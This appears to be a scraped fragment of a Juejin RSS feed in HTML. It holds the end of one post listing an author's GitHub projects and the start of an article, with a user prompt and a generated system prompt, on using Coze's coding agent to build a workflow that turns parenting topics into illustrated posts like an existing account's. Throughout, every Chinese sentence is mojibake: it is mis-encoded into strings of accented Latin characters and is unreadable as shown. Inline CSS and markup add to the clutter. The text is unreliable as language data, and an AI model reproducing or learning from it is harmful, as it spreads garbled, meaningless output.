<p><strong>Claude Code Skills</strong>ï¼ˆæŒ‰éœ€åŠ è½½ï¼Œæ„å›¾è‡ªåŠ¨è¯†åˆ«ï¼Œä¸æµªè´¹ tokenï¼Œ<a href="https://juejin.cn/post/7578714735307735066" target="_blank" title="https://juejin.cn/post/7578714735307735066">ä»‹ç»æ–‡ç« </a>ï¼‰ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fcode-review-skill" target="_blank" title="https://github.com/tt-a1i/code-review-skill" ref="nofollow noopener noreferrer">code-review-skill</a> - ä»£ç å®¡æŸ¥æŠ€èƒ½ï¼Œè¦†ç›– React 19ã€Vue 3ã€TypeScriptã€Rust ç­‰çº¦ 9000 è¡Œè§„åˆ™ï¼ˆ<a href="https://juejin.cn/post/7578709098255908902" target="_blank" title="https://juejin.cn/post/7578709098255908902">è¯¦ç»†ä»‹ç»</a>ï¼‰</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2F5-whys-skill" target="_blank" title="https://github.com/tt-a1i/5-whys-skill" ref="nofollow noopener noreferrer">5-whys-skill</a> - 5 Whys æ ¹å› åˆ†æï¼Œè¯´"æ‰¾æ ¹å› "è‡ªåŠ¨æ¿€æ´»</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Ffirst-principles-skill" target="_blank" title="https://github.com/tt-a1i/first-principles-skill" ref="nofollow noopener noreferrer">first-principles-skill</a> - ç¬¬ä¸€æ€§åŸç†æ€è€ƒï¼Œé€‚åˆæ¶æ„è®¾è®¡å’ŒæŠ€æœ¯é€‰å‹</li>
</ul>
<p><strong>vibe coding åŸç†å­¦ä¹ </strong>ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fcoding-cli-guide" target="_blank" title="https://github.com/tt-a1i/coding-cli-guide" ref="nofollow noopener noreferrer">coding-cli-guide</a>ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Ftt-a1i.github.io%2Fcoding-cli-guide%2F%3Ftab%3Dstart-here" target="_blank" title="https://tt-a1i.github.io/coding-cli-guide/?tab=start-here" ref="nofollow noopener noreferrer">å­¦ä¹ ç½‘ç«™</a>ï¼‰- å­¦ä¹  qwen-cli æ—¶æ•´ç†çš„ç¬”è®°ï¼Œ40+ äº¤äº’å¼åŠ¨ç”»æ¼”ç¤º AI CLI å†…éƒ¨æœºåˆ¶</li>
</ul>
<p><strong>å…¨æ ˆé¡¹ç›®</strong>ï¼ˆé€‚åˆå­¦ä¹ ç°ä»£æŠ€æœ¯æ ˆï¼‰ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fprompt-vault" target="_blank" title="https://github.com/tt-a1i/prompt-vault" ref="nofollow noopener noreferrer">prompt-vault</a> - Prompt ç®¡ç†å™¨ï¼Œç”¨çš„éƒ½æ˜¯æœ€æ–°çš„æŠ€æœ¯æ ˆï¼Œé€‚åˆç”¨æ¥å­¦ä¹ äº†è§£æœ€æ–°çš„å‰ç«¯å…¨æ ˆå¼€å‘èŒƒå¼ï¼šNext.js 15 + React 19 + tRPC 11 + Supabase å…¨æ ˆç¤ºä¾‹ï¼Œclone ä¸‹æ¥é…ä¸ªå…è´¹ Supabase å°±èƒ½è·‘</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fchat_edit" target="_blank" title="https://github.com/tt-a1i/chat_edit" ref="nofollow noopener noreferrer">chat_edit</a> - åŒæ¨¡å¼ AI åº”ç”¨ï¼ˆèŠå¤©+å¯Œæ–‡æœ¬ç¼–è¾‘ï¼‰ï¼ŒVue 3.5 + TypeScript + Vite 5 + Quill 2.0 + IndexedDB</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ä¼šç¼–ç¨‹ï¼Ÿæ²¡å…³ç³»ï¼åƒèŠå¤©ä¸€æ ·â€œè°ƒæ•™â€æ‰£å­ç¼–ç¨‹ï¼Œä½ çš„â€œç«å¦ˆè‚²å„¿â€å¤åˆ»ç‰ˆé©¬ä¸Šä¸Šçº¿]]></title>    <link>https://juejin.cn/post/7589171972447158314</link>    <guid>https://juejin.cn/post/7589171972447158314</guid>    <pubDate>2025-12-30T02:37:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589171972447158314" data-draft-id="7589172193151418404" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ä¼šç¼–ç¨‹ï¼Ÿæ²¡å…³ç³»ï¼åƒèŠå¤©ä¸€æ ·â€œè°ƒæ•™â€æ‰£å­ç¼–ç¨‹ï¼Œä½ çš„â€œç«å¦ˆè‚²å„¿â€å¤åˆ»ç‰ˆé©¬ä¸Šä¸Šçº¿"/> <meta itemprop="keywords" content="Coze"/> <meta itemprop="datePublished" content="2025-12-30T02:37:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¾é³´"/> <meta itemprop="url" content="https://juejin.cn/user/3683842894347076"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ä¼šç¼–ç¨‹ï¼Ÿæ²¡å…³ç³»ï¼åƒèŠå¤©ä¸€æ ·â€œè°ƒæ•™â€æ‰£å­ç¼–ç¨‹ï¼Œä½ çš„â€œç«å¦ˆè‚²å„¿â€å¤åˆ»ç‰ˆé©¬ä¸Šä¸Šçº¿
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3683842894347076/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¾é³´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:37:38.000Z" title="Tue Dec 30 2025 02:37:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å¾é³´ã€‚ä¸“æ³¨äºåˆ†äº«æå‡å·¥ä½œä¸ç”Ÿæ´»æ•ˆç‡çš„å·¥å…·ï¼Œæ— å¿åˆ†äº«AIé¢†åŸŸç›¸å…³çš„ç²¾é€‰æŠ¥å‘Šï¼ŒæŒç»­å…³æ³¨AIçš„å‰æ²¿åŠ¨å‘ã€‚</p>
<p>å‰ä¸ä¹…æœ‰ä½æœ‹å‹ç»™æˆ‘å‘äº†ä¸€ä¸ªè‚²å„¿è´¦å·ï¼Œé—®æˆ‘èƒ½ä¸èƒ½ä½¿ç”¨æ‰£å­è¿›è¡Œå¤åˆ»ï¼Ÿ</p>
<p>æˆ‘çœ‹äº†çœ‹è¿™ä¸ªè´¦å·ï¼Œéƒ½æ˜¯åˆ†äº«ä¸€äº›è‚²å„¿ç›¸å…³çš„å†…å®¹ï¼Œæ—¨åœ¨åˆ†äº«è‚²å„¿ç›¸å…³æŠ€å·§ï¼Œçœ‹äº†çœ‹æ•°æ®æŒºä¸é”™ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/145db8e9bd2b4a7a9a8337bdc1ceb77d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=P903c27JnrTAfJR1SwPFBWUmKZg%3D" alt="" loading="lazy"/></p>
<p>åˆ†æäº†ä¸€ä¸‹è¿™ä¸ªè´¦å·çš„æ–‡ç« å†…å®¹ï¼Œå…¶å®åˆ¶ä½œè¿‡ç¨‹ä¸ç®—å¤æ‚ï¼Œå¤§è‡´çš„æµç¨‹å°±æ˜¯å…ˆç”¨å¤§æ¨¡å‹æ ¹æ®ä¸»é¢˜ç”Ÿæˆæ–‡æ¡ˆï¼Œç„¶åå†å°†æ–‡æ¡ˆåˆ¶ä½œæˆä½“æ„Ÿæ›´å¥½çš„å›¾ç‰‡ã€‚</p>
<p>æœ¬æ–‡æˆ‘è¦åˆ†äº«çš„æ˜¯æ€ä¹ˆæ ·ä½¿ç”¨æ‰£å­ç¼–ç¨‹ï¼ŒæŠŠè¿™ä¸ªè‚²å„¿æ¼«ç”»ç»™å¤åˆ»äº†ï¼Œåœ¨è®²è§£å…·ä½“çš„å®ç°è¿‡ç¨‹ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹æ‰£å­ç¼–ç¨‹è‡ªåŠ¨å¸®æˆ‘å®ç°çš„å·¥ä½œæµä»¥åŠå·¥ä½œæµå‡ºå›¾çš„æ•ˆæœã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3402a33ace0244e59171451930f4d3ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=Q4k%2BoAXRbM%2B80yhyCZKL9PJ0O5I%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/46c557ea9c3343bbb9e5695be7f348a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=rZtNTGWlsVRnf7J6v77OnUP%2FU%2FE%3D" alt="" loading="lazy"/></p>
<p>å¯ä»¥çœ‹åˆ°è¿™å‡ å¼ å›¾ç‰‡çš„äººç‰©ä¸€è‡´æ€§ä¿æŒå¾—å¾ˆå¥½ï¼Œå…¶æ¬¡å°±æ˜¯ä¸­æ–‡æ˜¯ä¸€ç‚¹ç‚¹ä¹±ç éƒ½æ²¡æœ‰ï¼Œå…³é”®æ˜¯è¿™ä¸ªå·¥ä½œæµæ˜¯æ‰£å­ç¼–ç¨‹å¸®æˆ‘è‡ªåŠ¨ç”Ÿæˆçš„ã€‚</p>
<h2 data-id="heading-0">1. å·¥ä½œæµåˆ¶ä½œè¿‡ç¨‹</h2>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬è¦å»å¯¹æ ‡è´¦å·å¤„æ”¶é›†ä¸€äº›ç´ æï¼Œä»¥ä¾¿å¯ä»¥æŠŠæ”¶é›†åˆ°çš„è¿™äº›ç´ æè¿åŒæç¤ºè¯ä¸€èµ·å–‚ç»™æ‰£å­ç¼–ç¨‹æ™ºèƒ½ä½“ï¼Œç´ ææ˜¯ä»¥â€œæ–‡ç« æ ‡é¢˜â€ä¸ºæ–‡ä»¶å¤¹åç§°ï¼Œæ–‡ä»¶å¤¹ä¸‹æ–¹æ”¾ç½®æ”¶é›†åˆ°çš„ä¸€äº›å›¾ç‰‡ï¼Œå¹¶ä¸”æŠŠæ”¶é›†åˆ°çš„ç´ æéƒ½æ‰“æˆä¸€ä¸ªzipåŒ…ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11ad69c6dd034e02b57a4695af5d9637~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=rBxOsfrVyuYJF022s0D%2FoinUak8%3D" alt="" loading="lazy"/></p>
<p>ç„¶åï¼Œæˆ‘ä»¬å»åˆ°æ‰£å­ç¼–ç¨‹çš„é¦–é¡µï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.coze.cn%2Fhome" target="_blank" title="https://code.coze.cn/home" ref="nofollow noopener noreferrer">code.coze.cn/home</a>ï¼‰ï¼Œé€‰ä¸­â€œå·¥ä½œæµâ€ï¼ŒæŠŠä½ é‡‡é›†å¥½çš„ç´ æä¸Šä¼ ç»™æ‰£å­ç¼–ç¨‹æ™ºèƒ½ä½“ï¼Œå¹¶ä¸”è¾“å…¥å’’è¯­ï¼Œç„¶åç‚¹å‡»æäº¤ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9718823b60f493d9c792f89df870ded~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=boM8jRRL5YL8MT8NjQEJiaTKlE8%3D" alt="" loading="lazy"/></p>
<pre><code class="hljs">æˆ‘ç»™ä½ ä¸Šä¼ äº†ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œé‡Œé¢çš„å†…å®¹æ˜¯æˆ‘ç»™ä½ çš„å‚è€ƒä¾‹å­ï¼Œé‡Œé¢æœ‰ä¸‰ä¸ªæ–‡ä»¶å¤¹ï¼Œæ¯ä¸ªæ–‡ä»¶å¤¹çš„åç§°æ˜¯ç›¸å…³çš„è‚²å„¿ä¸»é¢˜ï¼Œæ–‡ä»¶å¤¹é‡Œé¢çš„å›¾ç‰‡æ˜¯å¯¹åº”çš„è‚²å„¿ä¸»é¢˜ç”Ÿæˆçš„å›¾ç‰‡ï¼Œå›¾ç‰‡é‡Œé¢çš„æ˜¯è‚²å„¿æ–‡æ¡ˆï¼Œéœ€è¦ä½ ç†è§£ä¸»é¢˜ä¸æ–‡æ¡ˆçš„é£æ ¼ï¼Œå¸®æˆ‘ç”Ÿæˆä¸€ä¸ªå·¥ä½œæµï¼Œå·¥ä½œæµå¯ä»¥æ¥æ”¶ä¸€ä¸ªè‚²å„¿ç›¸å…³çš„ä¸»é¢˜ï¼Œç„¶åç”Ÿæˆè‚²å„¿æ–‡æ¡ˆï¼Œæœ€åå°†è‚²å„¿æ–‡æ¡ˆåˆæˆåˆ°é»„åº•çš„å›¾ç‰‡ä¸­ï¼Œé£æ ¼è¦å’Œç»™ä½ çš„æ¡ˆä¾‹çš„å›¾ç‰‡çš„é£æ ¼ä¸€è‡´ï¼Œå›¾ç‰‡çš„æ•°é‡ä¸º3-6å¼ ï¼ŒæŒ‰ç…§ç”Ÿæˆçš„è‚²å„¿æ–‡æ¡ˆé•¿çŸ­é€‰æ‹©æœ€åçš„å›¾ç‰‡æ•°é‡ï¼Œå¦‚æœå›¾ç‰‡ä¸­æœ‰é…å›¾ï¼Œé‚£ä¹ˆé…å›¾ç»Ÿä¸€ä¸ºæ‰‹ç»˜é£æ ¼çš„å†™å®æ¼«ç”»ï¼Œç¦æ­¢å‡ºç°çœŸäººé…å›¾ã€‚
</code></pre>
<p>æ‰£å­ç¼–ç¨‹æ™ºèƒ½ä½“ï¼Œå°±å¼€å§‹æ€è€ƒï¼Œç„¶åè§„åˆ’æ‰§è¡Œè·¯å¾„ï¼Œæœ€åå¼€å§‹æ‰§è¡Œï¼Œæˆ‘ä»¬çœ‹ä¸€çœ‹å®ƒçš„æ€è€ƒè¿‡ç¨‹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1a0eed314e5b4837ba064d51810fa3e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=YtFrPrxAc%2Bm8jUkJ4b9sX0LMzyg%3D" alt="" loading="lazy"/></p>
<p>è¿™ä¸ªå…¶å®å°±æ˜¯è·Ÿäººçš„è¡Œä¸ºå¾ˆç›¸ä¼¼äº†ï¼Œæ¥åˆ°ä»»åŠ¡åï¼Œå…ˆæ‹†è§£æˆè®¡åˆ’ï¼Œç„¶åå†ä¸€æ­¥æ­¥æ‰§è¡Œï¼Œæ‰§è¡Œè¿‡ç¨‹æœ‰é—®é¢˜åˆä¼šé‡æ–°æ€è€ƒï¼Œè°ƒæ•´æ‰§è¡Œè®¡åˆ’ã€‚</p>
<p>è¿‡ç¨‹ä¸ä¼šé‚£ä¹ˆé¡ºåˆ©ï¼Œè¿™ç‚¹éœ€è¦æœ‰é¢„æœŸï¼Œç¬¬ä¸€æ¬¡æ‰§è¡Œå¥½ä¹‹åï¼Œæˆ‘å‘ç°å®ƒç»™æˆ‘è¾“å…¥çš„å›¾ç‰‡åœ°å€å±…ç„¶æ˜¯æœ¬åœ°ç”µè„‘ä¸Šçš„åœ°å€ï¼Œæ²¡æ³•é¢„è§ˆæŸ¥çœ‹ã€‚</p>
<p>æ‰€ä»¥æˆ‘å°±ç»™å®ƒæäº†ä¸€ä¸ªè¦æ±‚ï¼Œè¦æ±‚å®ƒç»™æˆ‘è¾“å‡ºå¯ä»¥ç›´æ¥é¢„è§ˆçš„httpå›¾ç‰‡åœ°å€ï¼Œè¿™é‡ŒåªçŸ¥é“å›¾ç‰‡çœ‹ä¸äº†ï¼Œæ‰€ä»¥è¡¨è¾¾äº†æˆ‘æƒ³è¦ç›´æ¥é¢„è§ˆè¾“å‡ºçš„å›¾ç‰‡çš„éœ€æ±‚ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60846e2da19a4c4184f7683e981e3c6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=UdJB%2Fmu4EejoLF8zUk38mUOdPqM%3D" alt="" loading="lazy"/></p>
<p>é€šè¿‡è¿™ä¸ªè°ƒæ•´ï¼Œæˆ‘å¯ä»¥ç›´æ¥çœ‹åˆ°å·¥ä½œæµç»™æˆ‘è¾“å‡ºçš„å®Œæ•´çš„å›¾ç‰‡äº†ï¼Œä½†æ˜¯è¾“å‡ºçš„å›¾ç‰‡æ’ç‰ˆå®åœ¨å¤ªä¸‘äº†ï¼Œç›´æ¥å°±æ˜¯æ–‡æ¡ˆå†™åœ¨å›¾ç‰‡çš„æ•´ä¸­å¤®ï¼Œé»‘ä½“ï¼Œä¸€ç‚¹å„¿ç¾æ„Ÿéƒ½æ²¡æœ‰ï¼Œæ‰€ä»¥æˆ‘æœ‰å‘å®ƒæå‡ºäº†æˆ‘çš„çœŸå®æƒ³æ³•ï¼Œè®©å®ƒå¸®æˆ‘ä¿®æ”¹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e14bde816b26424c9bce8e9dcd84894b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=pYBdA6CwNjIE%2FmdSNd8RxQ3myPc%3D" alt="" loading="lazy"/></p>
<p>ç»è¿‡è¿™ä¸€æ¬¡çš„å†è°ƒæ•´ï¼Œå·¥ä½œæµè¾“å‡ºçš„å›¾æ–‡åŸºæœ¬ä¸Šç¬¦åˆæˆ‘çš„é¢„æœŸäº†ï¼Œæ•ˆæœå°±æ˜¯å¦‚å¼€å¤´æ‰€ç¤ºã€‚</p>
<p>ä¸Šé¢å°±æ˜¯ä½¿ç”¨æ‰£å­ç¼–ç¨‹åˆ¶ä½œè¿™ä¸ªå·¥ä½œæµçš„è¿‡ç¨‹ï¼Œå°±åªä½¿ç”¨äº†ä¸‰è½®çš„å¯¹è¯å°±æŠŠè¿™ä¸ªå·¥ä½œæµç”Ÿæˆå¥½äº†ã€‚ä¸‹é¢å°†æ¥çœ‹çœ‹ç”Ÿæˆçš„è¿™ä¸ªå·¥ä½œæµçš„è¯¦ç»†èŠ‚ç‚¹çŠ¶å†µã€‚</p>
<h2 data-id="heading-1">2. å·¥ä½œæµè¯¦è§£</h2>
<h3 data-id="heading-2">2.1 å¼€å§‹</h3>
<p>å·¥ä½œæµçš„å¼€å§‹èŠ‚ç‚¹ï¼Œåªæ¥æ”¶ä¸€ä¸ªä¸»é¢˜ä½œä¸ºå·¥ä½œæµè¾“å…¥çš„å‚æ•°ï¼Œå¯ä»¥è¾“å…¥è‚²å„¿ç›¸å…³çš„ä¸»é¢˜ï¼Œæ¯”å¦‚â€œå­©å­è¯´è„è¯æ—¶çˆ¶æ¯è¿™æ ·åšâ€ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eee23f4dc1c146e18150c74831860e54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=Kk5289BObTD374OXTgPXqmEAu18%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">2.2 è‚²å„¿æ–‡æ¡ˆç”Ÿæˆ</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥æ ¹æ®è¾“å…¥çš„ä¸»é¢˜ï¼Œç”Ÿæˆå¯¹åº”çš„æ¼«ç”»æ–‡æ¡ˆï¼Œçœ‹æ‰£å­ç¼–ç¨‹ç»™ç”Ÿæˆçš„æç¤ºè¯è¿˜æ˜¯å¾ˆä¸“ä¸šçš„ï¼Œæç¤ºè¯æ¶æ„ä¸Šå¾ˆå®Œæ•´ï¼Œæ¨¡å‹å¯ä»¥è‡ªè¡Œä¿®æ”¹é€‰æ‹©ï¼Œæœ‰è±†åŒ…ã€deepseekã€kimiå¤šç§é€‰æ‹©ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99da582b8af34f31bbde07c642732816~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=4MMCuiiJMmuoALyan3uW2mEZgig%3D" alt="" loading="lazy"/></p>
<ul>
<li>ç³»ç»Ÿæç¤ºè¯</li>
</ul>

<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># è§’è‰²å®šä¹‰</span>
ä½ æ˜¯ä¸€ä½ä¸“ä¸šçš„è‚²å„¿æ–‡æ¡ˆåˆ›ä½œä¸“å®¶ï¼Œæ“…é•¿æ’°å†™é€‚åˆå°çº¢ä¹¦ç­‰ç¤¾äº¤å¹³å°åˆ†äº«çš„è‚²å„¿å†…å®¹ã€‚

<span class="hljs-section"># ä»»åŠ¡ç›®æ ‡</span>
æ ¹æ®ç”¨æˆ·æä¾›çš„è‚²å„¿ä¸»é¢˜ï¼Œç”Ÿæˆç¬¦åˆå°çº¢ä¹¦é£æ ¼çš„è‚²å„¿æ–‡æ¡ˆã€‚

<span class="hljs-section"># å·¥ä½œæµä¸Šä¸‹æ–‡</span>
<span class="hljs-bullet">-</span> <span class="hljs-strong">**Input**</span>ï¼šè‚²å„¿ä¸»é¢˜å­—ç¬¦ä¸²
<span class="hljs-bullet">-</span> <span class="hljs-strong">**Process**</span>ï¼š
<span class="hljs-bullet">  1.</span> ç†è§£è‚²å„¿ä¸»é¢˜çš„æ ¸å¿ƒå†…å®¹
<span class="hljs-bullet">  2.</span> ç»“åˆè‚²å„¿ä¸“ä¸šçŸ¥è¯†ï¼Œæ’°å†™æ¸©é¦¨ã€å®ç”¨ã€æœ‰å¸å¼•åŠ›çš„æ–‡æ¡ˆ
